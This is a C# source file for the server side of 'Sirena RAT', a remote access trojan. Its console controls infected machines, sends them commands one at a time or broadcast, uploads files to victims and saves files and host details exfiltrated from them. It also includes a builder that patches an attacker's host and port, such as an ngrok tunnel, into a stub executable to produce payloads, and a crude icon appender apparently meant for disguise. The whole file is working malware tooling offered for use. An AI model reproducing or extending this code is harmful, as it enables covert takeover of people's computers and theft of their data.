using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
namespace SirenaRAT
{
    internal class Program
    {
        private const int PORT = 1337;
        private static readonly TcpListener Listener = new TcpListener(IPAddress.Any, PORT);
        private static readonly List<ClientSession> Clients = new();
        private static ClientSession Selected = null;
        private static readonly object LockObj = new();

        static async Task Main()
        {
            Console.Title = "Sirena RAT";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.ResetColor();

            Console.WriteLine($"[SERVER] Listening on port {PORT}");
            Console.WriteLine("[BUILDER] Type: build:0.tcp.ngrok.io 1337 → generates payload\n");

            Listener.Start();
            _ = Task.Run(StatusLoop);
            _ = Task.Run(CommandLoop);

            while (true)
            {
                TcpClient client = await Listener.AcceptTcpClientAsync();
                var session = new ClientSession(client);
                lock (LockObj) Clients.Add(session);
                _ = Task.Run(() => HandleClient(session));
            }
        }

        // Command handler
        static async Task CommandLoop()
        {
            while (true)
            {
                Console.Write(Selected != null
                    ? $"\n[{Selected.Id} | {Selected.Ip}] > "
                    : "\n[MAIN] > ");

                string input = Console.ReadLine()?.Trim();
                if (string.IsNullOrEmpty(input)) continue;

                // BUILDER COMMAND
                if (input.StartsWith("build:"))
                {
                    var parts = input["build:".Length..].Trim().Split(' ', StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length != 2 || !int.TryParse(parts[1], out int port))
                    {
                        Console.WriteLine("[-] Usage: build:0.tcp.ngrok.io 1337");
                        continue;
                    }
                    BuildPayload(parts[0].Trim(), port);
                    continue;
                }

                if (Selected != null)
                {
                    if (input.Equals("disconnect", StringComparison.OrdinalIgnoreCase))
                    {
                        Selected = null;
                        PrintClients();
                        continue;
                    }

                    if (input.StartsWith("broadcast:"))
                    {
                        string cmd = input["broadcast:".Length..].Trim();
                        lock (LockObj)
                            foreach (var c in Clients)
                                _ = c.SendEncrypted(cmd);
                        Console.WriteLine($"[+] Broadcast sent to {Clients.Count} clients");
                        continue;
                    }

                    await Selected.SendEncrypted(input);

                    // Upload file to victim
                    if (input.StartsWith("upload:"))
                    {
                        string path = input["upload:".Length..].Trim();
                        if (File.Exists(path))
                        {
                            byte[] file = File.ReadAllBytes(path);
                            await Selected.Stream.WriteAsync(file);
                            Console.WriteLine($"[+] Uploaded: {path} ({file.Length} bytes)");
                        }
                        else Console.WriteLine("[-] File not found");
                    }
                }
                else
                {
                    if (input.StartsWith("connect:") && int.TryParse(input.AsSpan(8), out int id))
                    {
                        lock (LockObj)
                        {
                            Selected = Clients.Find(c => c.Id == id);
                            if (Selected != null)
                                Console.WriteLine($"[+] Connected to client {id}");
                            else
                                Console.WriteLine("[-] Client not found");
                        }
                    }
                    else if (input == "list" || input == "clear")
                    {
                        PrintClients();
                    }
                    else if (input == "exit")
                    {
                        Environment.Exit(0);
                    }
                    else
                    {
                        Console.WriteLine("Commands: build:host port | connect:id | list | clear | exit");
                    }
                }
            }
        }

        // Payload builder (compiles Client.cs on-the-fly)
        static void BuildPayload(string host, int port)
        {
            if (!File.Exists("Stub.exe")) { Console.WriteLine("[-] Stub.exe missing"); return; }

            byte[] stub = File.ReadAllBytes("Stub.exe");

            string h = host.PadRight(15)[..15];
            string p = port.ToString().PadRight(5)[..5];

            ReplaceBytes(stub, Encoding.ASCII.GetBytes("0.0.0.0".PadRight(15)), Encoding.ASCII.GetBytes(h));
            ReplaceBytes(stub, Encoding.ASCII.GetBytes("1337".PadRight(5)), Encoding.ASCII.GetBytes(p));

            string output = $"Sirena_{host}_{port}.exe";
            File.WriteAllBytes(output, stub);
            Console.WriteLine($"[OK] Payload → {output}");
        }
        static void ReplaceBytes(byte[] data, byte[] old, byte[] @new)
        {
            for (int i = 0; i < data.Length - old.Length; i++)
                if (data.Skip(i).Take(old.Length).SequenceEqual(old))
                    Array.Copy(@new, 0, data, i, @new.Length);
        }

        // Client handler
        static async Task HandleClient(ClientSession session)
        {
            var stream = session.Stream;

            try
            {
                // Receive AES key
                byte[] buffer = new byte[4];
                await stream.ReadAsync(buffer, 0, 4);
                int keyLen = BitConverter.ToInt32(buffer, 0);
                byte[] key = new byte[keyLen]; await stream.ReadAsync(key, 0, keyLen);
                byte[] iv = new byte[16]; await stream.ReadAsync(iv, 0, 16);
                session.SetAes(key, iv);

                buffer = new byte[1024 * 256];
                while (session.Tcp.Connected)
                {
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead <= 0) break;

                    string encrypted = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    string data = session.Decrypt(encrypted);
                    if (string.IsNullOrEmpty(data)) continue;

                    session.UpdateInfo(data);

                    if (data.StartsWith("FILE|"))
                    {
                        var parts = data.Split('|');
                        string filename = parts[1];
                        byte[] filedata = Convert.FromBase64String(parts[2]);
                        File.WriteAllBytes(filename, filedata);
                        Console.WriteLine($"[+] Downloaded: {filename} ({filedata.Length} bytes)");
                    }
                }
            }
            catch { }
            finally
            {
                lock (LockObj)
                {
                    Clients.Remove(session);
                    if (Selected == session) Selected = null;
                }
            }
        }

        static void StatusLoop()
        {
            while (true)
            {
                lock (LockObj) Console.Title = $"Sirena RAT | Online: {Clients.Count} | {DateTime.Now:HH:mm}";
                if (Selected == null) PrintClients();
                Thread.Sleep(20000);
            }
        }

        static void PrintClients()
        {
            lock (LockObj)
            {
                Console.Clear();
                Console.WriteLine("  S I R E N A   R A T  B E T A \n");
                if (Clients.Count == 0)
                    Console.WriteLine("   No clients connected\n");
                else
                    foreach (var c in Clients)
                        Console.WriteLine($"{(Selected == c ? "→ " : "  ")}{c.Id}: {c.Ip} | {c.Info.Substring(0, Math.Min(80, c.Info.Length))}{(c.Info.Length > 80 ? "..." : "")}");

                Console.WriteLine("Commands: build:host port | connect:id | list | clear | exit");
                Console.WriteLine("In session: disconnect | broadcast:cmd | upload:file.txt\n");
            }
        }
    }

    // Client session class
    class ClientSession
    {
        public TcpClient Tcp { get; }
        public NetworkStream Stream => Tcp.GetStream();
        public int Id { get; }
        public string Ip => ((IPEndPoint)Tcp.Client.RemoteEndPoint).Address.ToString();
        public string Info { get; private set; } = "waiting for info...";
        private Aes Aes;
        private static int NextId = 0;

        public ClientSession(TcpClient tcp)
        {
            Tcp = tcp;
            Id = Interlocked.Increment(ref NextId);
        }

        public void SetAes(byte[] key, byte[] iv)
        {
            Aes = Aes.Create();
            Aes.Key = key;
            Aes.IV = iv;
        }

        public string Decrypt(string b64)
        {
            try
            {
                byte[] data = Convert.FromBase64String(b64);
                using var ms = new MemoryStream(data);
                using var cs = new CryptoStream(ms, Aes.CreateDecryptor(), CryptoStreamMode.Read);
                using var sr = new StreamReader(cs, Encoding.UTF8);
                return sr.ReadToEnd().TrimEnd('\r', '\n');
            }
            catch { return ""; }
        }

        public async Task SendEncrypted(string cmd)
        {
            try
            {
                byte[] encrypted = Encrypt(cmd + "\n");
                await Stream.WriteAsync(encrypted);
            }
            catch { }
        }

        private byte[] Encrypt(string plain) => Encrypt(Encoding.UTF8.GetBytes(plain));
        private byte[] Encrypt(byte[] data)
        {
            using var ms = new MemoryStream();
            using var cs = new CryptoStream(ms, Aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }

        public void UpdateInfo(string data)
        {
            if (data.Contains("PC:") || data.Contains("User:") || data.Contains("Procs:"))
                Info = data;
            else if (!data.StartsWith("FILE|"))
                Console.WriteLine($"[Client {Id}]: {data}");
        }
    }

    // Simple icon injector (works for most cases)
    public static class IconInjector
    {
        public static byte[] InjectIcon(byte[] exe, byte[] icon)
        {
            using var ms = new MemoryStream();
            ms.Write(exe, 0, exe.Length);
            ms.Write(icon, 0, icon.Length);
            return ms.ToArray();
        }
    }
}